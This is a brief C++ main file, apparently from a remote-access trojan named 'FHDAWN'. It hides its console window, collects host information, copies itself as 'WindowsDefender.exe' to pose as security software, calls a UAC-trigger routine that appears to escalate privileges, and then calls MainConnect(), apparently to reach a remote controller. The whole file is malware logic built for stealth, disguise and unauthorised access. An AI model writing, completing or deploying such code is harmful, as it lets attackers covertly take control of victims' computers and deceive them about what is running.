#include "fhdawn.h"

int main()
{
    FHDAWN fhd;
    
    // std::cout << fhd.GetInformation() << std::endl;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    fhd.GetInformation();
    std::string filename = "WindowsDefender.exe";
    if(!fhd.IsAdmin())
    {
        fhd.copyFile(fhd.MyLocation().c_str(), filename.c_str());
        UACTrigger();
        Sleep(2000);
        DWORD check = fhd.ProcessId((LPSTR)filename.c_str());
        if(check != 0){
            exit(0);
        }
    } 
    fhd.MainConnect();
}
